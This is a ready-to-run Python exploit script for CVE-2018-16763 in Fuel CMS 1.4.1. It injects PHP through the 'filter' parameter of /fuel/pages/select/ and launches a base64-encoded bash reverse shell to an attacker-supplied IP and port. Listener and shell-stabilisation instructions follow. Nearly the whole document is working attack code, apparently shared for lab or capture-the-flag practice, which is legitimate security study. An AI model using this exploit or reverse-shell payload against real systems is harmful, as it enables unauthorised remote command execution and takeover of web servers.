#!/usr/bin/env python3
"""
CVE-2018-16763 - Fuel CMS 1.4.1 Remote Code Execution (Unauthenticated)

This script exploits a vulnerability in Fuel CMS ≤ 1.4.1 where unsanitized input 
to the 'filter' parameter in /fuel/pages/select/ is evaluated as PHP code.

By injecting a specially crafted payload, we can execute arbitrary system commands 
as the web server user (typically www-data). This version launches a reverse shell.

Author: Dv.Smith (PacketHorse)
Date: 2025-06-06
License: MIT
"""

import requests
import urllib.parse
import base64

def build_payload(command):
    """
    Builds a valid PHP expression payload using the known bypass:
    '+pi(print($a='system'))+$a('<command>')+'
    """
    php_payload = f"'+pi(print($a='system'))+$a('{command}')+'"
    return urllib.parse.quote(php_payload)

def send_payload(target_url, payload):
    """
    Sends the payload to the vulnerable endpoint via GET request.
    """
    full_url = f"{target_url}/fuel/pages/select/?filter={payload}"
    print(f"\n[+] Sending payload to:\n{full_url}\n")

    try:
        response = requests.get(full_url, timeout=10)
        print("[*] Status Code:", response.status_code)
        print("[*] First 500 bytes of response:\n")
        print(response.text[:500])
    except Exception as e:
        print("[-] Request failed:", e)

def main():
    print("=== Fuel CMS 1.4.1 RCE Exploit (CVE-2018-16763) ===")

    target = input("[?] Target base URL (e.g., http://10.10.67.9): ").strip().rstrip('/')
    lhost = input("[?] Your IP for reverse shell: ").strip()
    lport = input("[?] Port to listen on: ").strip()

    # Reverse shell payload using bash, encoded with base64 to avoid issues
    bash_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    b64_payload = base64.b64encode(bash_shell.encode()).decode()
    final_cmd = f"echo {b64_payload} | base64 -d | bash"

    print(f"\n[!] Start your listener before continuing: nc -lvnp {lport}")
    input("[*] Press Enter to send the exploit...\n")

    encoded = build_payload(final_cmd)
    send_payload(target, encoded)

    print("\n[✔] If the target is vulnerable, you should get a shell shortly.")
    print("[!] To stabilize your shell, run this inside the session:")
    print("    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
    print("    export TERM=xterm; stty rows 40 columns 120\n")

if __name__ == "__main__":
    main()
